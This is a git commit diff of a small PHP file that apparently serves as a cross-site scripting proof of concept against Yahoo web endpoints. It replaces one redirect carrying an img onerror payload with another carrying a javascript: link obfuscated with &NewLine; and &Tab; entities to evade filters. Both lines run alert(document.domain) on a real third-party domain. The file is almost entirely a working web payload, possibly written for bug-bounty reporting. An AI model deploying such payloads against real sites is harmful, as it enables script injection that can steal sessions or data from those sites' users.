f0b7f9b1682fdf4276e76b23611649afe946b017
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-12 23:40:52 +0100

    Update yahoo1.php

--- yahoo1.php
+++ yahoo1.php
@@ -1,1 +1,2 @@
-<?php header('Location: https://y-flickr.yahoo.com/ad?rmx=1111&count=8888&r=144444&ri=1190645158&callback=YUI.Env.JSONP.aaa%3Cimg%20src=%20onerror=alert(document.domain)%3E')?>
+<?php header('Location: http://api.view.yahoo.com/api/series/aaa%3Ca%20href='ja&NewLine;&Tab;vasc&NewLine;&Tab;ript:alert(document.domain)%3Exss%20me%3C%2Fa%3E')?>
+  
